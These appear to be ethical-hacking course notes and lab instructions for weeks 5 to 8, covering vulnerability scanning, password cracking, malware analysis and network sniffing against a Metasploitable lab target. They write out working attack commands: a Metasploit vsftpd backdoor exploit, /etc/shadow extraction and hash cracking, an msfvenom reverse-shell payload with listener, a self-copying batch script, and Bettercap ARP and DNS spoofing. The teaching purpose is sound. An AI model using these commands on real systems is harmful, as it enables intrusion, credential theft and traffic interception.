## WEEK 5: Vulnerability Analysis

### 📖 Lecture Notes

#### Topics Covered
- Vulnerability Assessment Concepts
- Vulnerability Classification
- CVSS (Common Vulnerability Scoring System)
- Vulnerability Assessment Tools
- Nessus Vulnerability Scanner
- OpenVAS
- Vulnerability Management Lifecycle
- False Positives and False Negatives
- Reporting Vulnerabilities

#### Key Concepts

**Vulnerability Assessment vs. Penetration Testing:**
- **Vulnerability Assessment:** Identify, classify, and prioritize vulnerabilities (broader scope)
- **Penetration Testing:** Actively exploit vulnerabilities to demonstrate impact (deeper scope)

**Vulnerability Sources:**
- CVE (Common Vulnerabilities and Exposures): https://cve.mitre.org/
- NVD (National Vulnerability Database): https://nvd.nist.gov/
- Vendor security advisories
- Security researcher disclosures
- Exploit databases (Exploit-DB, Metasploit)

**CVSS Scoring System (v3.1):**

| Score Range | Severity |
|-------------|----------|
| 0.0 | None |
| 0.1 - 3.9 | Low |
| 4.0 - 6.9 | Medium |
| 7.0 - 8.9 | High |
| 9.0 - 10.0 | Critical |

**CVSS Base Metrics:**
- **Attack Vector (AV):** Network, Adjacent, Local, Physical
- **Attack Complexity (AC):** Low, High
- **Privileges Required (PR):** None, Low, High
- **User Interaction (UI):** None, Required
- **Scope (S):** Unchanged, Changed
- **Confidentiality (C):** None, Low, High
- **Integrity (I):** None, Low, High
- **Availability (A):** None, Low, High

**Vulnerability Assessment Process:**
1. Define scope and rules of engagement
2. Discover assets and services
3. Identify vulnerabilities
4. Classify and prioritize findings
5. Recommend remediation
6. Report findings
7. Retest after remediation

#### Essential Tools

| Tool | Type | Cost |
|------|------|------|
| Nessus | Commercial scanner | Free (up to 16 IPs) |
| OpenVAS | Open-source scanner | Free |
| Qualys | Cloud-based platform | Commercial |
| Nikto | Web server scanner | Free |
| Nmap NSE | Network scripts | Free |

---

### 🔧 Practical Lab 5: Vulnerability Scanning

#### Objectives
- Install and configure Nessus Essentials
- Perform vulnerability scan on Metasploitable
- Analyze scan results
- Prioritize vulnerabilities using CVSS
- Create vulnerability report

#### Step-by-Step Instructions

**Step 1: Install Nessus Essentials**
```
1. Visit: https://www.tenable.com/products/nessus/nessus-essentials
2. Register for free activation code
3. Download Nessess for your OS
4. Install and activate with your code
5. Access at: https://localhost:8834
```

**Step 2: Create Your First Scan**
```
1. Log into Nessus web interface
2. Click "New Scan"
3. Select "Basic Network Scan"
4. Configure:
   - Name: Metasploitable Scan
   - Targets: <Metasploitable_IP>
   - Credentials: Leave blank for unauthenticated scan
5. Save and launch scan
```

**Step 3: Analyze Results**
```
1. Review vulnerability summary
2. Sort by CVSS score (highest first)
3. Click individual vulnerabilities for details
4. Note:
   - CVE identifiers
   - CVSS scores
   - Affected services
   - Remediation recommendations
```

**Step 4: Nikto Web Server Scan**
```bash
# Scan web server on Metasploitable
nikto -h http://<target>

# Save output
nikto -h http://<target> -o nikto_results.txt
```

**Step 5: Nmap Vulnerability Scripts**
```bash
# Run vulnerability detection scripts
nmap --script vuln <target>

# Specific vulnerability checks
nmap --script smb-vuln-ms08-067 <target>
nmap --script ftp-vsftpd-backdoor <target>
```

#### Expected Outcomes
- Complete vulnerability scan results
- Prioritized vulnerability list with CVSS scores
- Understanding of false positives
- Professional vulnerability report format

---

### 📝 Assignment 5

**Part A: Vulnerability Report (70 points)**
1. Scan Metasploitable using Nessus
2. Identify the top 10 vulnerabilities by CVSS score
3. For each vulnerability, document:
   - CVE identifier
   - CVSS score and severity
   - Affected service/port
   - Brief description
   - Recommended remediation
   - Potential impact if exploited

**Part B: Analysis Questions (30 points)**
1. What is the difference between a false positive and a false negative?
2. Why might an unauthenticated scan miss vulnerabilities?
3. How does CVSS help prioritize remediation efforts?
4. What are the limitations of automated vulnerability scanners?

**Submission Format:** Professional vulnerability report, 5-10 pages.

---

---

## WEEK 6: System Hacking

### 📖 Lecture Notes

#### Topics Covered
- Credential Management
- Password Cracking Techniques
- Privilege Escalation
- Executing Applications
- Hiding Files
- Covering Tracks
- Rootkits and Backdoors
- Steganography
- Anti-Forensics

#### Key Concepts

**System Hacking Methodology:**
1. **Cracking Passwords** - Gain initial access
2. **Escalating Privileges** - Gain higher permissions
3. **Executing Applications** - Run tools on target
4. **Hiding Files** - Conceal evidence
5. **Covering Tracks** - Remove logs and artifacts
6. **Maintaining Access** - Install persistence mechanisms

**Password Cracking Methods:**
- **Dictionary Attack:** Try words from a wordlist
- **Brute Force Attack:** Try all possible combinations
- **Rainbow Tables:** Pre-computed hash tables
- **Hybrid Attack:** Dictionary + mutations (add numbers, symbols)
- **Password Spraying:** Try common passwords against many accounts
- **Credential Stuffing:** Use breached credentials from other sites

**Common Password Hashes:**
```
LM Hash:      Legacy Windows (weak, easily cracked)
NTLM Hash:    Windows NT and later
MD5:          Common in web applications (broken)
SHA-1:        Common (deprecated for security)
SHA-256:      Modern standard
SHA-512:      Higher security
bcrypt:       Slow hash, designed for passwords
```

**Privilege Escalation Vectors:**
- Unpatched operating system vulnerabilities
- Misconfigured services
- Weak file permissions
- Stored credentials
- Kernel exploits
- DLL hijacking
- Token manipulation
- Scheduled tasks
- SUID/SGID binaries (Linux)

#### Password Cracking Tools

| Tool | Best For | Platform |
|------|----------|----------|
| John the Ripper | Multiple hash types | Linux/Windows |
| Hashcat | GPU-accelerated cracking | Linux/Windows |
| Hydra | Online password attacks | Linux |
| Medusa | Network login cracking | Linux |
| Cain & Abel | Windows passwords | Windows |
| Mimikatz | Windows credentials | Windows |
| pwdump | Windows SAM extraction | Windows |

---

### 🔧 Practical Lab 6: Password Cracking & System Access

#### Objectives
- Extract password hashes from target
- Crack passwords using multiple methods
- Achieve initial access to Metasploitable
- Practice privilege escalation
- Document the process

#### Step-by-Step Instructions

**Step 1: FTP Exploitation (Metasploitable)**
```bash
# Metasploitable has vsftpd 2.3.4 backdoor
nmap -p 21 -sV <target>

# Use Metasploit
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target>
run
# You should get a root shell!
```

**Step 2: Password Hash Extraction**
```bash
# Once you have access, extract password hashes
cat /etc/passwd
cat /etc/shadow  # Requires root

# Combine for cracking
unshadow /etc/passwd /etc/shadow > passwords.txt
```

**Step 3: Crack Passwords with John the Ripper**
```bash
# Basic dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

# View cracked passwords
john --show passwords.txt
```

**Step 4: Crack Passwords with Hashcat**
```bash
# If you have MD5 hashes
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# For NTLM hashes
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt

# Monitor progress
hashcat -s
```

**Step 5: SSH Access with Cracked Credentials**
```bash
# Use cracked credentials
ssh user@<target>

# Explore the system
whoami
id
uname -a
```

**Step 6: Privilege Escalation (Linux)**
```bash
# Check kernel version
uname -r
# Search for kernel exploits: searchsploit linux kernel <version>

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for writable files owned by root
find / -writable -type f 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Check for sudo permissions
sudo -l
```

#### Expected Outcomes
- Successful exploitation of vsftpd backdoor
- Password hashes extracted and cracked
- SSH access achieved with credentials
- Understanding of privilege escalation vectors

---

### 📝 Assignment 6

**Part A: System Hacking Documentation (60 points)**
1. Exploit the vsftpd 2.3.4 backdoor on Metasploitable using Metasploit
2. Extract password hashes
3. Crack at least 3 passwords using John the Ripper or Hashcat
4. Use cracked credentials to log in via SSH
5. Document each step with screenshots

**Part B: Privilege Escalation Research (40 points)**
Research and explain 5 Linux privilege escalation techniques:
1. Kernel exploits
2. SUID/SGID binaries
3. Writable configuration files
4. Cron job manipulation
5. sudo misconfigurations

For each technique, provide:
- How it works
- How to identify the vulnerability
- How to exploit it
- How to prevent it

**Submission Format:** Detailed technical document with commands and screenshots.

---

---

## WEEK 7: Malware Threats

### 📖 Lecture Notes

#### Topics Covered
- Malware Types: Viruses, Worms, Trojans, Rootkits, Ransomware
- Malware Behavior and Characteristics
- APTs (Advanced Persistent Threats)
- Malware Analysis Techniques
- Static vs. Dynamic Analysis
- Sandboxing
- Fileless Malware
- Malware Obfuscation
- Malware Detection and Prevention

#### Key Concepts

**Malware Categories:**

| Type | Characteristics | Example |
|------|----------------|---------|
| Virus | Attaches to legitimate files, requires user action | ILOVEYOU, Melissa |
| Worm | Self-replicating, spreads automatically | Conficker, WannaCry |
| Trojan | Disguised as legitimate software | Emotet, ZeuS |
| Rootkit | Hides deep in OS, kernel-level access | Flame, Stuxnet |
| Ransomware | Encrypts files, demands payment | Locky, CryptoLocker |
| Spyware | Monitors user activity | Keyloggers, adware |
| Logic Bomb | Triggers on specific condition | Time-based, event-based |
| Backdoor | Bypasses normal authentication | Netcat reverse shells |

**Malware Working Mechanisms:**
1. **Infection:** Initial delivery vector (email, USB, download)
2. **Execution:** Malware runs on target system
3. **Persistence:** Maintains access across reboots
4. **Propagation:** Spreads to other systems
5. **Payload Delivery:** Executes malicious function

**APT Characteristics:**
- Highly targeted and well-funded
- Multi-phase, long-term campaigns
- Custom malware and zero-day exploits
- Goal: espionage and data theft (not destruction)
- Examples: APT28 (Fancy Bear), APT29 (Cozy Bear), Lazarus Group

**Indicators of Compromise (IOCs):**
- Unusual network traffic patterns
- Unexpected system behavior
- Unknown processes or services
- Modified system files
- Unusual registry changes
- Suspicious log entries

#### Malware Analysis Approaches

**Static Analysis:**
- Examine file without executing
- Check file hashes (MD5, SHA-256)
- Strings extraction
- PE header analysis
- Disassembly (Ghidra, IDA Pro)

**Dynamic Analysis:**
- Execute malware in controlled environment
- Monitor system changes
- Network traffic analysis
- API call monitoring
- Registry/file system changes

---

### 🔧 Practical Lab 7: Malware Analysis (Safe Environment)

#### Objectives
- Analyze malware samples in isolated sandbox
- Perform static analysis techniques
- Observe malware behavior dynamically
- Identify IOCs
- **SAFETY FIRST: Never analyze live malware outside isolated lab**

#### ⚠️ CRITICAL SAFETY WARNINGS
```
1. ONLY use intentionally created "malware" in your isolated lab
2. NEVER download actual malware samples
3. NEVER connect malware VM to any network
4. ALWAYS snapshot before analysis
5. USE dedicated analysis VM that is never used for personal activities
```

#### Safe Alternative: Create Test "Malware" for Analysis

**Step 1: Create a Simple Batch "Virus" (Educational)**
```batch
@echo off
:: This is a SIMPLE educational demo
:: Creates copies of itself (simulating worm behavior)
copy %0 C:\Users\Public\test_copy1.bat
copy %0 C:\Users\Public\test_copy2.bat
echo This is a SAFE educational demonstration > C:\Users\Public\readme.txt
```

**Step 2: Analyze the File (Static Analysis)**
```cmd
:: Check file hash
certutil -hashfile test.bat SHA256

:: View strings (PowerShell)
Get-Content test.bat

:: Check file properties
dir test.bat
```

**Step 3: Analyze in Controlled Environment**
```
1. Take snapshot of Windows VM
2. Disconnect VM from network
3. Execute the file
4. Monitor what happens:
   - New files created
   - Registry changes
   - Process creation
5. Revert to snapshot when done
```

**Step 4: Use Metasploit Payloads (Lab Only)**
```bash
# Generate a safe reverse shell payload for lab
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f elf > shell.elf

# Start listener in Metasploit
msfconsole
use exploit/multi/handler
set payload linux/x86/shell_reverse_tcp
set LHOST <Kali_IP>
set LPORT 4444
exploit

# Execute payload on Metasploitable (in lab only)
# This demonstrates how attackers maintain access
```

**Step 5: Examine Malware Signatures with YARA**
```bash
# Install YARA
sudo apt install yara

# Create simple YARA rule
cat > test_rule.yar << EOF
rule TestRule {
    strings:
        $malicious = "cmd.exe"
    condition:
        $malicious
}
EOF

# Test against file
yara test_rule.yar /path/to/file
```

#### Expected Outcomes
- Understanding of malware analysis methodology
- Ability to perform basic static analysis
- Knowledge of malware types and behavior
- Awareness of analysis safety procedures

---

### 📝 Assignment 7

**Part A: Malware Analysis Report (50 points)**
1. Create a simple batch file that demonstrates worm-like behavior (copying itself)
2. Perform static analysis on the file:
   - Calculate file hash
   - Extract strings
   - Document file properties
3. Execute in isolated environment and document:
   - Files created
   - System changes
   - Process behavior
4. Revert VM and write analysis report

**Part B: Research Paper (50 points)**
Research one of the following malware families and write a 3-5 page report:
- WannaCry Ransomware
- Stuxnet
- Emotet
- SolarWinds Supply Chain Attack
- NotPetya

Report should include:
- Timeline of the attack
- Attack vector and propagation method
- Technical details of the malware
- Impact and damage caused
- Lessons learned and defenses

**Submission Format:** Two separate documents (analysis report + research paper).

---

---

## WEEK 8: Sniffing

### 📖 Lecture Notes

#### Topics Covered
- Network Sniffing Concepts
- MAC Flooding
- DHCP Starvation Attacks
- ARP Poisoning
- DNS Spoofing
- Switch Port Spoofing
- Packet Crafting and Analysis
- Wiretapping
- Sniffing Countermeasures

#### Key Concepts

**What is Sniffing?**
Sniffing (or packet analysis) is the practice of intercepting and reading network traffic. This can reveal usernames, passwords, emails, files, and other sensitive data transmitted in cleartext.

**Protocol Vulnerabilities:**
- **HTTP:** Transmits data in cleartext
- **FTP:** Sends credentials in cleartext
- **Telnet:** All traffic visible
- **SMTP/POP3/IMAP:** Email content visible
- **HTTPS/SSH/SCP:** Encrypted (safe from sniffing)

**ARP Poisoning (Man-in-the-Middle):**
```
Normal ARP:
PC1 asks: "Who has 192.168.1.1?"
Router responds: "I do, my MAC is AA:BB:CC:DD:EE:FF"

ARP Poisoning:
PC1 asks: "Who has 192.168.1.1?"
Attacker responds: "I do, my MAC is 11:22:33:44:55:66" (LIE!)
PC1 updates ARP cache with attacker's MAC
All traffic to router now goes through attacker
```

**Promiscuous Mode:**
Normal network cards only process packets destined for their MAC address. Promiscuous mode processes ALL packets on the network segment.

**Wireshark Display Filters:**
```
ip.addr == 192.168.1.100
tcp.port == 80
http.request.method == "POST"
dns
ftp
telnet
smtp
```

#### Essential Sniffing Tools

| Tool | Purpose | Features |
|------|---------|----------|
| Wireshark | Packet capture/analysis | GUI, deep protocol analysis |
| tcpdump | Command-line capture | Lightweight, scriptable |
| Bettercap | MITM attacks | ARP spoofing, DNS spoofing |
| Ettercap | MITM framework | Packet manipulation |
| Cain & Abel | Windows sniffing | ARP poisoning, password recovery |
| Dsniff | Password sniffing | Cleartext credential capture |

---

### 🔧 Practical Lab 8: Network Sniffing and Analysis

#### Objectives
- Capture and analyze network traffic
- Identify cleartext credentials
- Perform ARP poisoning (lab only)
- Use Wireshark filters effectively
- Understand the importance of encryption

#### Step-by-Step Instructions

**Step 1: Introduction to Wireshark**
```bash
# Start Wireshark
sudo wireshark

# Or capture from command line
sudo tcpdump -i eth0 -w capture.pcap

# Capture specific traffic
sudo tcpdump -i eth0 port 80 -w http_capture.pcap
```

**Step 2: Capture HTTP Traffic (Cleartext)**
```bash
# On Kali, start capturing
sudo tcpdump -i eth0 -w http_capture.pcap

# On another machine, visit an HTTP site on Metasploitable:
# http://<target>/dvwa/

# Log in with credentials (admin/password)

# Stop capture and open in Wireshark
wireshark http_capture.pcap
```

**Step 3: Extract Credentials from Capture**
```
In Wireshark:
1. Apply filter: http.request.method == "POST"
2. Find the login POST request
3. Right-click > Follow > HTTP Stream
4. View username and password in cleartext!

Alternative filters:
- ftp.request.command    # FTP commands (includes LOGIN)
- telnet.data            # Telnet data
- smtp                   # SMTP emails
```

**Step 4: TCP Stream Analysis**
```
1. Find a TCP conversation in Wireshark
2. Right-click packet > Follow > TCP Stream
3. View entire conversation in order
4. This reconstructs the full communication
```

**Step 5: ARP Poisoning with Bettercap**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Launch Bettercap
sudo bettercap -iface eth0

# In Bettercap console:
net.probe on
net.recon on

# Discover targets
net.show

# Start ARP spoofing
set arp.spoof.targets <target_ip>
arp.spoof on

# Monitor traffic
net.sniff on
```

**⚠️ Stop ARP spoofing when done:**
```bash
arp.spoof off
# Disable IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward
```

**Step 6: DNS Spoofing**
```bash
# Using Bettercap
set dns.spoof.domains example.com
set dns.spoof.all true
dns.spoof on

# Now DNS requests for example.com resolve to your machine
# Useful for phishing demonstrations and MITM attacks
```

#### Expected Outcomes
- Ability to capture and analyze network traffic
- Understanding of cleartext protocol vulnerabilities
- Experience with Wireshark filters
- Knowledge of ARP poisoning mechanics
- Appreciation for encryption importance

---

### 📝 Assignment 8

**Part A: Packet Analysis Exercise (50 points)**
1. Set up a packet capture on your lab network
2. Generate HTTP, FTP, and Telnet traffic from Metasploitable
3. Capture the traffic and analyze in Wireshark
4. Extract the following from captures:
   - HTTP login credentials
   - FTP commands and responses
   - Any files transferred
5. Document your process with screenshots

**Part B: Wireshark Challenge (50 points)**
Download this practice PCAP file or create your own:
https://www.wireshark.org/download/

Answer the following questions by analyzing the capture:
1. What is the IP address of the web server?
2. What credentials were used to log in?
3. What files were downloaded?
4. What protocols were used?
5. Reconstruct a full TCP stream and document the conversation

**Bonus:** Create a custom Wireshark display filter that shows only login attempts.

**Submission Format:** Analysis document with answers and supporting screenshots.

---

---
